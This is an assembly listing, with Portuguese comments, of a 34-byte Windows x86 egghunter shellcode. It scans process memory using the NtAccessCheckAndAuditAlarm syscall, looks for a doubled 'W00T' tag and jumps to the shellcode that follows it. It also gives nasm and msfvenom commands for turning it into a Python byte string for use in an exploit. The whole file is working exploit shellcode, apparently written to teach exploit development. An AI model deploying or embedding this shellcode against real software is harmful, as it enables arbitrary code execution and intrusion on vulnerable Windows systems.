     1                                  [BITS 32]
     2                                  
     3                                  ; EggHunter usando a função NtAccessCheckAndAuditAlarm
     4                                  ; Autor: Helvio Junior (M4v3r1cK)
     5                                  ;
     6                                  ; Procedimento de compilação do EggHunter
     7                                  ; nasm egghunter1.asm -o egghunter -l egghunter.lst
     8                                  ; cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python
     9                                  ;
    10                                  ; 34 bytes egghunter
    11                                  
    12                                  _start:
    13 00000000 89CA                        mov edx,ecx             ; Copia o endereço de EXC para EDX
    14 00000002 EB06                        jmp loop_check          ; salta para a checagem
    15                                  
    16                                  loop_inc_page:
    17 00000004 6681CAFF0F                  or dx,0x0fff            ; adiciona 4KB ao endereço do EDX
    18                                  
    19                                  loop_inc_one:
    20 00000009 42                          inc edx                 ; atua como um contador
    21                                                              ; incrementa 1 ao valor de EDX
    22                                  
    23                                  loop_check:                 ; checa o endereço atual
    24 0000000A 52                          push edx                ; coloca (PUSH) EDX na pilha
    25 0000000B 6A02                        push byte +0x2          ; coloca 0x2 na pilha 
    26                                                              ; use o 0x02 para NtAccessCheckAndAuditAlarm
    27                                                              ; ou use 0x43 para NtDisplayString
    28 0000000D 58                          pop eax                 ; retira 0x02 ou 0x43 da pilha e o coloca em EAX
    29                                                              ; desta forma este valor é utilizado como parâmetro do syscall
    30 0000000E CD2E                        int 0x2e                ; realiza um System call (para o kernel) usando o registro EAX
    31 00000010 3C05                        cmp al,0x5              ; checa de ocorreu uma violação de acesso
    32                                                              ; (0xc0000005== ACCESS_VIOLATION) 5
    33 00000012 5A                          pop edx                 ; restaura o edx
    34 00000013 74EF                        je loop_inc_page        ; caso tenho ocorrido uma violação de acesso (erro), salta para 'loop_inc_page'
    35                                                              ; que irá adicionar 4KB a página e continuar a checagem
    36                                  
    37                                  is_the_egg:
    38 00000015 B854303057                  mov eax,0x57303054      ; este é o EGG, ou seja o texto que estamos procurando (W00T)
    39 0000001A 89D7                        mov edi,edx             ; define EDI para nosso endereço de memória
    40 0000001C AF                          scasd                   ; compara EAX com o conteúdo de EDI (que é o conteúdo do EDX)
    41 0000001D 75EA                        jnz loop_inc_one        ; checa se são iguais, caso não, salta para loop_inc_one
    42                                                              ; caso sejam simplesmente continua a execução indo para o próximo passo
    43 0000001F AF                          scasd                   ; realiza a checagem do proximo endereçamento de memória EDX + 4, para checar o segundo EGG
    44 00000020 75E7                        jnz loop_inc_one        ; checa se são iguais, caso não, salta para loop_inc_one
    45                                                              ; caso sejam simplesmente continua a execução indo para o próximo passo
    46                                  
    47                                  matched:
    48 00000022 FFE7                        jmp edi                 ; EDI aponta para o início do shellcode
    49                                                              ; realiza um JMP para o shellcode
